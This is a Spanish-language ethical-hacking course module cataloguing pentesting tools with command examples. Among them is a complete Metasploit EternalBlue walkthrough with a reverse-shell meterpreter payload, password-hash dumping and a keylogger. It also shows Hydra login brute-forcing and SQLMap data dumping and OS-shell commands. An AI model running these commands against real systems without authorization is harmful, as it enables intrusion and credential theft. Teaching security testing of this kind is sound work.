# 🛠️ Módulo 5: Herramientas del Trade

## 📖 Introducción

Un hacker ético necesita dominar un arsenal de herramientas. Aquí aprenderás las más importantes.

---

## 🐉 Kali Linux

### ¿Qué es Kali Linux?
Distribución de Linux diseñada para pentesting con +600 herramientas preinstaladas.

### Instalación
```bash
# Opción 1: Máquina Virtual (Recomendado para empezar)
1. Descarga VirtualBox: https://www.virtualbox.org/
2. Descarga Kali: https://www.kali.org/get-kali/
3. Crea VM con 4GB RAM, 50GB disco
4. Instala desde ISO

# Opción 2: WSL2 en Windows
wsl --install -d kali-linux

# Opción 3: Live USB (sin instalar)
```

### Categorías de Herramientas
```
📁 Information Gathering
   └── Reconocimiento y recopilación

📁 Vulnerability Analysis
   └── Análisis de vulnerabilidades

📁 Web Application Analysis
   └── Pruebas de aplicaciones web

📁 Password Attacks
   └── Ataques de contraseñas

📁 Wireless Attacks
   └── Ataques a redes WiFi

📁 Exploitation Tools
   └── Herramientas de explotación

📁 Sniffing & Spoofing
   └── Captura y manipulación de tráfico

📁 Post Exploitation
   └── Actividades post-compromiso

📁 Forensics
   └── Análisis forense

📁 Reporting Tools
   └── Generación de informes
```

---

## 🔍 Nmap - Network Mapper

### La herramienta de escaneo por excelencia

```bash
# Escaneo básico
nmap 192.168.1.1

# Escaneo de múltiples hosts
nmap 192.168.1.1 192.168.1.2 192.168.1.3
nmap 192.168.1.1-100
nmap 192.168.1.0/24

# Escaneo de puertos específicos
nmap -p 80 192.168.1.1
nmap -p 80,443,8080 192.168.1.1
nmap -p 1-1000 192.168.1.1
nmap -p- 192.168.1.1  # Todos los puertos (65535)

# Tipos de escaneo
nmap -sT 192.168.1.1   # TCP Connect (ruidoso pero fiable)
nmap -sS 192.168.1.1   # SYN Scan (sigiloso, requiere root)
nmap -sU 192.168.1.1   # UDP Scan (lento pero importante)
nmap -sV 192.168.1.1   # Detectar versiones de servicios
nmap -O 192.168.1.1    # Detectar sistema operativo

# Escaneo agresivo (todo en uno)
nmap -A 192.168.1.1    # OS + versiones + scripts + traceroute

# Scripts NSE (Nmap Scripting Engine)
nmap --script=default 192.168.1.1
nmap --script=vuln 192.168.1.1         # Buscar vulnerabilidades
nmap --script=http-enum 192.168.1.1    # Enumerar web
nmap --script=smb-vuln* 192.168.1.1    # Vulnerabilidades SMB

# Escaneo sigiloso
nmap -sS -T2 -f 192.168.1.1   # Fragmentar paquetes, velocidad baja

# Guardar resultados
nmap -oN output.txt 192.168.1.1    # Formato normal
nmap -oX output.xml 192.168.1.1    # Formato XML
nmap -oG output.gnmap 192.168.1.1  # Formato grepeable
nmap -oA output 192.168.1.1        # Todos los formatos
```

### Opciones de Temporización

```
-T0: Paranoico (muy lento, evasivo)
-T1: Sigiloso
-T2: Educado
-T3: Normal (default)
-T4: Agresivo
-T5: Insano (muy rápido, ruidoso)
```

---

## 🦈 Wireshark

### Captura y análisis de tráfico de red

### Filtros Esenciales

```
# Por protocolo
http
dns
tcp
udp
icmp
arp

# Por IP
ip.addr == 192.168.1.1
ip.src == 192.168.1.1
ip.dst == 192.168.1.1

# Por puerto
tcp.port == 80
tcp.dstport == 443
udp.port == 53

# Combinaciones
http && ip.addr == 192.168.1.1
tcp.port == 80 || tcp.port == 443
!(arp || dns)

# Buscar texto
http contains "password"
tcp contains "admin"

# Flags TCP
tcp.flags.syn == 1
tcp.flags.rst == 1
```

### Qué Buscar

```
🔍 Credenciales en texto plano (HTTP, FTP, Telnet)
🔍 Cookies de sesión
🔍 Datos sensibles transmitidos
🔍 Patrones de tráfico sospechoso
🔍 Ataques de red (ARP spoofing, etc.)
```

---

## 🕷️ Burp Suite

### La herramienta esencial para pentesting web

### Componentes Principales

```
┌─────────────────────────────────────────────────────────────┐
│  PROXY                                                       │
│  Intercepta tráfico entre navegador y servidor              │
│  Permite modificar requests/responses en tiempo real        │
└─────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────┐
│  REPEATER                                                    │
│  Envía requests modificados manualmente                     │
│  Ideal para probar inyecciones                              │
└─────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────┐
│  INTRUDER                                                    │
│  Automatiza ataques con payloads                            │
│  Fuerza bruta, fuzzing                                      │
└─────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────┐
│  DECODER                                                     │
│  Codifica/decodifica datos                                  │
│  Base64, URL encoding, HTML entities                        │
└─────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────┐
│  COMPARER                                                    │
│  Compara responses                                          │
│  Útil para detectar diferencias sutiles                     │
└─────────────────────────────────────────────────────────────┘
```

### Configuración Básica

```
1. Abre Burp Suite
2. Ve a Proxy > Options
3. Asegura que escucha en 127.0.0.1:8080
4. Configura tu navegador para usar proxy 127.0.0.1:8080
5. Instala certificado CA de Burp para HTTPS
   - Visita http://burp en el navegador
   - Descarga e instala el certificado
```

### Flujo de Trabajo Típico

```
1. Navega por la aplicación con proxy activo
2. Revisa el Site Map para entender la estructura
3. Identifica puntos de entrada (parámetros, headers)
4. Usa Repeater para probar inyecciones manualmente
5. Usa Intruder para automatizar ataques
6. Documenta hallazgos
```

---

## 🎯 Metasploit Framework

### El framework de explotación más potente

### Estructura

```
msf6 > 

Tipos de módulos:
├── exploits/     # Código que explota vulnerabilidades
├── payloads/     # Código que se ejecuta tras explotar
├── auxiliary/    # Escáneres, fuzzers, etc.
├── post/         # Post-explotación
├── encoders/     # Ofuscar payloads
└── nops/         # Instrucciones NOP
```

### Comandos Básicos

```bash
# Iniciar Metasploit
msfconsole

# Buscar módulos
msf6 > search type:exploit platform:windows smb
msf6 > search cve:2017-0144

# Usar un módulo
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Ver opciones
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Configurar opciones
msf6 > set RHOSTS 192.168.1.100
msf6 > set LHOST 192.168.1.50
msf6 > set LPORT 4444

# Ver payloads compatibles
msf6 > show payloads

# Seleccionar payload
msf6 > set payload windows/x64/meterpreter/reverse_tcp

# Ejecutar exploit
msf6 > exploit
# o
msf6 > run

# Verificar si es vulnerable (sin explotar)
msf6 > check
```

### Meterpreter (Post-Explotación)

```bash
# Una vez tienes shell meterpreter:

meterpreter > sysinfo              # Info del sistema
meterpreter > getuid               # Usuario actual
meterpreter > getsystem            # Intentar escalar a SYSTEM
meterpreter > hashdump             # Extraer hashes de contraseñas
meterpreter > screenshot           # Capturar pantalla
meterpreter > keyscan_start        # Iniciar keylogger
meterpreter > keyscan_dump         # Ver teclas capturadas
meterpreter > upload /path/file    # Subir archivo
meterpreter > download file        # Descargar archivo
meterpreter > shell                # Obtener shell del sistema
meterpreter > background           # Enviar sesión a background
meterpreter > migrate PID          # Migrar a otro proceso
```

### Ejemplo Completo

```bash
# Escanear red para encontrar hosts vulnerables a EternalBlue
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 > set RHOSTS 192.168.1.0/24
msf6 > run

# Explotar host vulnerable
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.1.100
msf6 > set LHOST 192.168.1.50
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > exploit

# Post-explotación
meterpreter > sysinfo
meterpreter > getsystem
meterpreter > hashdump
```

---

## 🔐 Herramientas de Contraseñas

### John the Ripper

```bash
# Crackear hashes
john hashes.txt

# Con wordlist específica
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Especificar formato
john --format=raw-md5 hashes.txt
john --format=sha512crypt hashes.txt

# Mostrar contraseñas crackeadas
john --show hashes.txt

# Reglas para generar variaciones
john --wordlist=words.txt --rules hashes.txt
```

### Hashcat (GPU, más rápido)

```bash
# Identificar tipo de hash
hashid 'hash_aqui'
# o
hashcat --example-hashes | grep -i 'md5'

# Crackear MD5
hashcat -m 0 hashes.txt wordlist.txt

# Tipos comunes:
# -m 0     MD5
# -m 100   SHA1
# -m 1000  NTLM
# -m 1800  SHA512crypt (Linux)
# -m 3200  bcrypt

# Con reglas
hashcat -m 0 hashes.txt wordlist.txt -r rules/best64.rule

# Ataque de fuerza bruta
hashcat -m 0 hashes.txt -a 3 ?a?a?a?a?a?a
# ?a = todos los caracteres
# ?l = minúsculas
# ?u = mayúsculas
# ?d = dígitos
```

### Hydra (Fuerza Bruta Online)

```bash
# SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# FTP
hydra -L users.txt -P passwords.txt ftp://192.168.1.1

# HTTP POST Form
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form \
    "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP Basic Auth
hydra -l admin -P passwords.txt 192.168.1.1 http-get /admin

# Opciones útiles
-t 4     # Número de threads
-V       # Verbose
-f       # Parar al encontrar
```

---

## 🕵️ Herramientas OSINT

### theHarvester
```bash
# Recopilar emails, subdominios, hosts
theHarvester -d target.com -b all
theHarvester -d target.com -b google,bing,linkedin
```

### Shodan
```bash
# Motor de búsqueda de dispositivos conectados
# https://www.shodan.io

# CLI
shodan init API_KEY
shodan search "apache"
shodan host 1.2.3.4
```

### WHOIS
```bash
whois target.com
```

### Recon-ng
```bash
recon-ng
[recon-ng] > marketplace search
[recon-ng] > marketplace install all
[recon-ng] > modules load recon/domains-hosts/hackertarget
[recon-ng] > options set SOURCE target.com
[recon-ng] > run
```

---

## 🌐 Herramientas Web

### Gobuster (Directory/DNS Brute Force)
```bash
# Enumerar directorios
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Enumerar subdominios
gobuster dns -d target.com -w subdomains.txt

# Con extensiones
gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt
```

### Nikto (Scanner de Web)
```bash
nikto -h http://target.com
nikto -h http://target.com -ssl
```

### SQLMap (SQL Injection automatizado)
```bash
# Básico
sqlmap -u "http://target.com/page?id=1"

# Con cookie
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"

# Enumerar bases de datos
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerar tablas
sqlmap -u "http://target.com/page?id=1" -D database --tables

# Extraer datos
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

# Obtener shell
sqlmap -u "http://target.com/page?id=1" --os-shell
```

### WPScan (WordPress)
```bash
# Escaneo básico
wpscan --url http://target.com

# Enumerar usuarios
wpscan --url http://target.com --enumerate u

# Enumerar plugins vulnerables
wpscan --url http://target.com --enumerate vp

# Con API token (más vulnerabilidades)
wpscan --url http://target.com --api-token YOUR_TOKEN
```

---

## 📊 Cheat Sheet de Herramientas

```
┌────────────────┬──────────────────────────────────────────┐
│ TAREA          │ HERRAMIENTA                              │
├────────────────┼──────────────────────────────────────────┤
│ Escaneo red    │ nmap, masscan                            │
│ Escaneo web    │ nikto, gobuster, dirb                    │
│ Proxy web      │ Burp Suite, OWASP ZAP                    │
│ SQL Injection  │ sqlmap                                   │
│ Passwords      │ john, hashcat, hydra                     │
│ Sniffing       │ wireshark, tcpdump                       │
│ Exploits       │ Metasploit, searchsploit                 │
│ OSINT          │ theHarvester, maltego, recon-ng          │
│ WiFi           │ aircrack-ng, wifite                      │
│ Reverse eng.   │ ghidra, radare2, IDA                     │
└────────────────┴──────────────────────────────────────────┘
```

---

## ➡️ Siguiente Módulo

[Continúa con Prácticas y Laboratorios →](../06-practicas/README.md)
